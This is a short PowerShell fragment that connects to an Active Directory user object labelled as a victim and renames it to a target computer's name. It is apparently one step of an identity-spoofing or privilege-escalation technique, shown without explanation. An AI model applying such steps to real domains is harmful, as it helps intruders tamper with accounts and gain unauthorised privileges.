$user = [ADSI]"LDAP://CN=VictimUserC,CN=Users,DC=external,DC=local"
$user.Rename("CN=TargetComputerC.external.local")
